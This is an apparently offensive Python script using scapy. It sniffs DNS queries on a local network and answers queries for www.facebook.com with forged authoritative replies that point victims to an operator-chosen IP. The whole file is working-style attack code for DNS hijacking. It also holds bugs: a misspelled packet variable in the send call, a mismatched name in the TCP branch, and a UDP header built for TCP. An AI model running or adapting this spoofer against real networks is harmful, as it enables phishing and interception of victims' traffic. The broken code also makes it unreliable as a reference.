from os import uname
from subprocess import call
from sys import argv, exit
from time import ctime, sleep
from scapy.all import *
import httplib

def usage():
    print(" Usage: ./dnsSpoof <interface> <IP of your DNS Server - this is more likely the IP on this system>")
    print(" e.g. ./dnsSpoof eth0 10.0.0.1")


def main():
    call('clear')

    if len(argv) != 3 :
        usage()
        exit(0)

    while 1:
        # Sniff the network for destination port 53 traffic
        print(' Sniffing for DNS Packet ')
        getDNSPacket = sniff(iface=argv[1], filter="dst port 53", count=1)

        # if the sniffed packet is a DNS Query, let's do some work
        if ( getDNSPacket[0].haslayer(DNS) ) and  ( getDNSPacket[0].getlayer(DNS).qr == 0 ) and (getDNSPacket[0].getlayer(DNS).qd.qtype == 1) and ( getDNSPacket[0].getlayer(DNS).qd.qclass== 1 ) and (getDNSPacket[0].getlayer(DNS).qd.qname == 'www.facebook.com.'):
            print('\n Got Query on %s ' %ctime())
            # Extract the src IP
            clientSrcIP = getDNSPacket[0].getlayer(IP).src
            
            # Extract UDP or TCP Src port
            if getDNSPacket[0].haslayer(UDP):
                clientSrcPort = getDNSPacket[0].getlayer(UDP).sport
            elif getDNSPacket[0].haslayer(TCP):
                clientSrcPort = getDNSPacket[0].getlayer(TCP).sport
            else:
                pass
            
            # DNS Query ID. The response's Query ID must match the request Query ID
            clientDNSQueryID = getDNSPacket[0].getlayer(DNS).id
            
            # Query Count
            clientDNSQueryDataCount = getDNSPacket[0].getlayer(DNS).qdcount

            # Extract client's current DNS server
            clientDNSServer = getDNSPacket[0].getlayer(IP).dst

            # Extract the DNS Query.
            clientDNSQuery = getDNSPacket[0].getlayer(DNS).qd.qname

            print(' Received Src IP:%s, \n Received Src Port: %d \n Received Query ID:%d \n Query Data Count:%d \n Current DNS Server:%s \n DNS Query:%s' %(clientSrcIP,clientSrcPort,clientDNSQueryID,clientDNSQueryDataCount,clientDNSServer,clientDNSQuery))

            # Turns 3rd arguement into spoofed DNS ip
            spoofedDNSServerIP = argv[2].strip()

            # IP Header
            spoofedIPPkt = IP(src=spoofedDNSServerIP,dst=clientSrcIP)

            # UDP or TCP header
            # Destination port has to match our client's.             
            if getDNSPacket[0].haslayer(UDP) : 
                spoofedUDP_TCPPacket = UDP(sport=53,dport=clientSrcPort)
            elif getDNSPacket[0].haslayer(TCP) : 
                spoofedUDP_TCPPPacket = UDP(sport=53,dport=clientSrcPort)

            # Bulding DNS protocol from scratch.
            spoofedDNSPacket = DNS(id=clientDNSQueryID,qr=1,opcode=getDNSPacket[0].getlayer(DNS).opcode,aa=1,rd=0,ra=0,z=0,rcode=0,qdcount=clientDNSQueryDataCount,ancount=1,nscount=1,arcount=1,qd=DNSQR(qname=clientDNSQuery,qtype=getDNSPacket[0].getlayer(DNS).qd.qtype,qclass=getDNSPacket[0].getlayer(DNS).qd.qclass),an=DNSRR(rrname=clientDNSQuery,rdata=argv[2].strip(),ttl=86400),ns=DNSRR(rrname=clientDNSQuery,type=2,ttl=86400,rdata=argv[2]),ar=DNSRR(rrname=clientDNSQuery,rdata=argv[2].strip()))
            
            # Send Packet
            print(' \n Sending spoofed response packet ')
            sendp(Ether()/spoofedIPPkt/spoofedUDP_TCPPacket/spoofedDNSPakcet,iface=argv[1].strip(), count=1)
            print(' Spoofed DNS Server: %s \n src port:%d dest port:%d ' %(spoofedDNSServerIP, 53, clientSrcPort ))

        else:
            pass


if __name__ == '__main__':
    main()